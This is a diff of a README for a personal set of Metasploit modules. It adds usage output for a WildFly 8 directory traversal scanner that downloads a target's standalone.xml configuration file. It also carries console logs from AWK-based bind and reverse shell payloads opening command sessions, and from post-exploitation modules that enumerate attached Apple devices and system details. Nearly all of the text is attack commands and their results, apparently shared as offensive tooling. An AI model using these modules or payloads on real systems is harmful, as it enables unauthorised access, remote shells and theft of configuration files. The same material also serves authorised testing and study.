@@ -1,12 +1,48 @@
 ## Modules for metasploit
 Some modules that I created for fun. :)
 
+### wildfly_traversal.rb
+WildFly 8 (JBossAS) Directory Traversal
+
+Output:
+```
+msf > use auxiliary/scanner/http/wildfly_8_traversal
+msf auxiliary(wildfly_8_traversal) > set RHOSTS 192.168.0.23
+RHOSTS => 192.168.0.23
+msf auxiliary(wildfly_8_traversal) > run
+
+[*] Attempting to download: standalone\\configuration\\standalone.xml
+[*] Server returns HTTP code: 200
+[*] File saved in:
+/home/espreto/.msf4/loot/20141126235426_default_192.168.0.23_wildfly.http_025501.xml
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+msf auxiliary(wildfly_8_traversal) > head -10
+/home/espreto/.msf4/loot/20141126235426_default_192.168.0.23_wildfly.http_025501.xml
+[*] exec: head -10
+/home/espreto/.msf4/loot/20141126235426_default_192.168.0.23_wildfly.http_025501.xml
+
+<?xml version='1.0' encoding='UTF-8'?>
+
+<server xmlns="urn:jboss:domain:2.1">
+    <extensions>
+        <extension module="org.jboss.as.clustering.infinispan"/>
+        <extension module="org.jboss.as.connector"/>
+        <extension module="org.jboss.as.deployment-scanner"/>
+        <extension module="org.jboss.as.ee"/>
+        <extension module="org.jboss.as.ejb3"/>
+        <extension module="org.jboss.as.jaxrs"/>
+msf auxiliary(wildfly_8_traversal) >
+
+```
+
+---
 ### bind_awk.rb
 Bind payload via AWK.
 
 Output:
 ```
-msf exploit(handler) > set PAYLOAD cmd/unix/bind_awk 
+msf exploit(handler) > set PAYLOAD cmd/unix/bind_awk
 PAYLOAD => cmd/unix/bind_awk
 msf exploit(handler) > set RHOST 127.0.0.1
 RHOST => 127.0.0.1
@@ -29,10 +65,10 @@ Output:
 msf post(enum_devices_apple) > run
 
 [+] Info:
-[+] 	Ubuntu 13.10  
+[+] 	Ubuntu 13.10
 [+] 	Linux test 3.11.0-13-generic #20-Ubuntu SMP Wed Oct 23 07:38:26 UTC 2013 x86_64 x86_64 x86_64 GNU/Linux
 [+] Vendor ID: 0x05ac
-[+] Product: iPhone 3GS 
+[+] Product: iPhone 3GS
 [+] Serial: 5b334d2..snip...
 [+] Path: /run/user/1000/gfvs/afc:host=5b334d2..snip..
 [-] Not mounted
@@ -50,7 +86,7 @@ msf post(enum_devices_apple) > run
 [+] 	Ubuntu 13.10  
 [+] 	Linux test 3.11.0-13-generic #20-Ubuntu SMP Wed Oct 23 07:38:26 UTC 2013 x86_64 x86_64 x86_64 GNU/Linux
 [+] Vendor ID: 0x05ac
-[+] Product: iPhone 3GS 
+[+] Product: iPhone 3GS
 [+] Serial: 5b334d2..snip..
 [+] Path: /run/user/1000/gfvs/afc:host=5b334d2..snip..
 [+] Files:
@@ -85,13 +121,13 @@ Output:
 ```
 msf exploit(handler) > run
 
-[*] Started reverse handler on 127.0.0.1:4444 
+[*] Started reverse handler on 127.0.0.1:4444
 [*] Starting the payload handler...
 [*] Command shell session 5 opened (127.0.0.1:4444 -> 127.0.0.1:55287) at 2014-10-14 14:09:09 -0300
 
 ^Z
 Background session 5? [y/N]  y
-msf exploit(handler) > use post/linux/gather/enum_system 
+msf exploit(handler) > use post/linux/gather/enum_system
 msf post(enum_system) > set SESSION 5
 SESSION => 5
 msf post(enum_system) > run
@@ -117,13 +153,13 @@ Reverse payload via AWK.
 
 Output:
 ```
-msf exploit(handler) > set PAYLOAD cmd/unix/reverse_awk 
+msf exploit(handler) > set PAYLOAD cmd/unix/reverse_awk
 PAYLOAD => cmd/unix/reverse_awk
 msf exploit(handler) > set LHOST 127.0.0.1
 LHOST => 127.0.0.1
 msf exploit(handler) > run
 
-[*] Started reverse handler on 127.0.0.1:4444 
+[*] Started reverse handler on 127.0.0.1:4444
 [*] Starting the payload handler...
 [*] Command shell session 4 opened (127.0.0.1:4444 -> 127.0.0.1:55286) at 2014-10-14 14:06:15 -0300
 
